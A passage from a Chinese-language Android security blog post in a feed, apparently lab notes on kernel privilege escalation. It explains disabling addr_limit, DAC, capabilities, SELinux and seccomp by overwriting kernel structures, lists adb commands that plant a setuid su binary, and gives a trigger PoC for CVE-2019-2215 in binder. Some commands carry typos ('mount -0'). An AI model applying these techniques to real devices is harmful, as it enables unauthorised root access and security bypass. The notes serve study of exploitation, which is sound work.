exec_sid;/* exec SID */</span><br><span class="line">u32 create_sid;/* fscreate SID */</span><br><span class="line">u32 keycreate_sid; /* keycreate SID */</span><br><span class="line">u32 sockcreate_sid; /* fscreate SID */</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>内核关键全局变量<br>selinux_enforcing<br>selinux_enabled<br>init_stack<br>对于没有KASLR的设备地址固定，偏移固定。</p></li></ul><h4 id="关闭内核缓释机制"><a href="#关闭内核缓释机制" class="headerlink" title="关闭内核缓释机制"></a>关闭内核缓释机制</h4><p>1、关闭addr_limit </p><ul><li>内核线程栈低偏移8字节为addr_limit,将addr_limit 改为-1（0xffffffffffffffff）,关闭之后即可任意读写内核。</li></ul><p>2、 关闭DAC </p><ul><li>修改进程安全凭证cred中进程id相关值uid、gid等为init进程的值</li></ul><p>3、关闭CAP </p><ul><li>修改进程安全凭证cred中的cap相关值 cap_inheritable等为init进程的值</li></ul><p>4、 关闭SELinux</p><ul><li>修改selinux_enforcing 为0</li><li>修改selinux_enbaled 为0</li><li>修改进程安全凭证cred中的security安全域 osid、sid、exec_sid、create_sid、kercreate_sid、sockcreate_sid为init进程的值</li></ul><p>5、关闭SECCOMP</p><ul><li><p>修改thread_info中的flags,将seccomp位置0</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TLE_SECCOMP 11</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _TIF_SECCOMP (1 &lt;&lt; TIE_SECCOMP)</span></span><br></pre></td></tr></table></figure></li><li><p>修改task_struct 中的seccomp中的mode为0</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">struct seccopm &#123;</span><br><span class="line">int mode;</span><br><span class="line">struct seccomp_filter *filter;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="持久化root"><a href="#持久化root" class="headerlink" title="持久化root"></a>持久化root</h4><p>只适用于低版本Android：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">adb shell mount -0 remount,rw /system</span><br><span class="line">adb push su /system/xbin/su</span><br><span class="line">adb shell chown 0.0 /system/xbin/su</span><br><span class="line">adb shell chmod 06755 /system/xbin/su</span><br><span class="line">adb shell mount -0 remount,ro /system</span><br><span class="line">adb install Superuser.apk</span><br></pre></td></tr></table></figure></p><p>高版本(Android 7.0 之后) 无解</p><h4 id="Android-内核任意地址读写思路"><a href="#Android-内核任意地址读写思路" class="headerlink" title="Android 内核任意地址读写思路"></a>Android 内核任意地址读写思路</h4><p>1、用户态不能直接访问内核态<br>2、需要借助内核函数完成内核任意地址读写</p><ul><li>系统调用由内核完成</li><li>寻找系统调用中搬到参数合法的方式-&gt;addr_limit</li><li>read/write、readv/writev、recvmsg/sendmsg 等</li></ul><h2 id="Android源码阅读网站"><a href="#Android源码阅读网站" class="headerlink" title="Android源码阅读网站"></a>Android源码阅读网站</h2><ul><li>Google官方提供<br><a href="https://cs.android.com/android/platform/superproject" target="_blank" rel="noopener">https://cs.android.com/android/platform/superproject</a></li><li>在线xref<br>  <a href="http://androidxref.com/" target="_blank" rel="noopener">http://androidxref.com/</a></li></ul><h2 id="Android环境搭建"><a href="#Android环境搭建" class="headerlink" title="Android环境搭建"></a>Android环境搭建</h2><p>本地环境 ubuntu 16.04</p><ul><li>SDK安装<br><a href="https://developer.android.com/studio/releases/platform-tools" target="_blank" rel="noopener">https://developer.android.com/studio/releases/platform-tools</a><br>下载最新版29（截止2020.1）  确定adb可以使用<br>安装可参考 <a href="https://blog.csdn.net/u011974797/article/details/78973012" target="_blank" rel="noopener">https://blog.csdn.net/u011974797/article/details/78973012</a></li><li>NDK安装<br><a href="https://developer.android.com/ndk/downloads" target="_blank" rel="noopener">https://developer.android.com/ndk/downloads</a><br>下载最新版r20b（截止2020.1）确定ndk-build可以使用<br>安装可参考 <a href="https://blog.csdn.net/fanx9339/article/details/81116332" target="_blank" rel="noopener">https://blog.csdn.net/fanx9339/article/details/81116332</a></li></ul><h2 id="Android-root实验"><a href="#Android-root实验" class="headerlink" title="Android root实验"></a>Android root实验</h2><p>给定一个含有驱动漏洞的Android虚拟机，通过该驱动漏洞实现root</p><h3 id="1-1-确定Android版本号"><a href="#1-1-确定Android版本号" class="headerlink" title="1.1 确定Android版本号"></a>1.1 确定Android版本号</h3><p>adb shell getprop ro.build.version.release</p><h3 id="1-2-寻找有漏洞的驱动设备"><a href="#1-2-寻找有漏洞的驱动设备" class="headerlink" title="1.2 寻找有漏洞的驱动设备"></a>1.2 寻找有漏洞的驱动设备</h3><p>搜索 cdev_init()函数<br>cdev_init() 加载驱动设备函数<br><img alt="1579157694160.png" data-src="https://i.loli.net/2020/02/02/ErcVTB6nq3DSsya.png" class="lozad"><br>qword_FFFFFFC00055C438 里面注册 dev_open,dev_ioctl等<br><img alt="1579157575646.png" data-src="https://i.loli.net/2020/02/02/GcL7xFIm2zOVHkj.png" class="lozad"></p><h3 id="1-3-提取kernel符号表"><a href="#1-3-提取kernel符号表" class="headerlink" title="1.3 提取kernel符号表"></a>1.3 提取kernel符号表</h3><p>python ./vmlinux.py ./test/pixel_vmlinux</p><h3 id="1-4-IDA加载kernel并导入符号表"><a href="#1-4-IDA加载kernel并导入符号表" class="headerlink" title="1.4 IDA加载kernel并导入符号表"></a>1.4 IDA加载kernel并导入符号表</h3><p>vmlinux.py        -&gt;        C:\Program Files\IDA x.x\loaders\</p><h3 id="1-5-分析漏洞并完成kernel任意地址读写"><a href="#1-5-分析漏洞并完成kernel任意地址读写" class="headerlink" title="1.5 分析漏洞并完成kernel任意地址读写"></a>1.5 分析漏洞并完成kernel任意地址读写</h3><p>通过fop发现ioctl中存在任意地址读写漏洞<br><img alt="1579159294971.png" data-src="https://i.loli.net/2020/02/02/HQRKcxVIS7Jm1uF.png" class="lozad"></p><h3 id="1-6-提权到root"><a href="#1-6-提权到root" class="headerlink" title="1.6 提权到root"></a>1.6 提权到root</h3><h2 id="CVE-2019-2215-复现"><a href="#CVE-2019-2215-复现" class="headerlink" title="CVE-2019-2215 复现"></a>CVE-2019-2215 复现</h2><p>影响版本 Android 9.0 kernel 4.4</p><p>driver/android/binder.c<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">binder_ioctl</span><span class="params">(struct file *filp, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> </span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">long</span> arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">case</span> BINDER_THREAD_EXIT:</span><br><span class="line">binder_debug(BINDER_DEBUG_THREADS, <span class="string">"%d:%d exit\n"</span>,</span><br><span class="line">proc-&gt;pid, thread-&gt;pid);</span><br><span class="line">binder_free_thread(proc, thread);</span><br><span class="line">thread = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">...</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>Android kernel    4.4        driver/android/binder.c<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">binder_free_thread</span><span class="params">(struct binder_proc *proc,</span></span></span><br><span class="line"><span class="function"><span class="params">struct binder_thread *thread)</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (send_reply)</span><br><span class="line">binder_send_failed_reply(send_reply, BR_DEAD_REPLY);</span><br><span class="line">binder_release_work(&amp;thread-&gt;todo);</span><br><span class="line">kfree(thread);</span><br><span class="line">binder_stats_deleted(BINDER_STAT_THREAD);</span><br><span class="line"><span class="keyword">return</span> active_transactions; &#125;</span><br></pre></td></tr></table></figure></p><h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/epoll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BINDER_THREAD_EXIT 0x40046208ul</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd, epfd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">event</span> = &#123;</span> .events = EPOLLIN &#125;;</span><br><span class="line">fd = open(<span class="string">"/dev/binder0"</span>, O_RDONLY);</span><br><span class="line">epfd = epoll_create(<span class="number">1000</span>);</span><br><span class="line">epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &amp;event);</span><br><span class="line">ioctl(fd, BINDER_THREAD_EXIT, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>##其他命令<br>连接 Android shell<br>./adb shell </p><p>1、获取手机系统信息（ CPU，厂商名称等）<br>adb shell “cat /system/build.prop | grep “product””<br>2、获取手机系统版本<br>adb shell getprop ro.build.version.release</p><p>3、获取手机系统api版本<br>adb shell getprop ro.build.version.sdk</p><p>4、获取手机设备型号<br>adb -d shell getprop ro.product.model</p><p>5、获取手机厂商名称<br>adb -d shell getprop ro.product.brand</p><p>6、获取手机的序列号<br>有两种方式</p><ul><li>1、  adb get-serialno</li><li>2、  adb shell getprop ro.serialno</li></ul><p>7、获取手机内存信息<br>adb shell cat /proc/meminfo</p><p>8、获取手机存储信息<br>adb shell df</p><p>9、获取手机物理密度<br>adb shell wm density</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;基础知识&quot;&gt;&lt;a href=&quot;#基础知识&quot; class=&quot;headerlink&quot; title=&quot;基础知识&quot;&gt;&lt;/a&gt;基础知识&lt;/h2&gt;&lt;h3 id=&quot;Android-系统架构&quot;&gt;&lt;a href=&quot;#Android-系统架构&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
      <category term="android" scheme="https://nocbtm.github.io/categories/android/"/>
    
    
      <category term="android" scheme="https://nocbtm.github.io/tags/android/"/>
    
  </entry>
  
</feed>
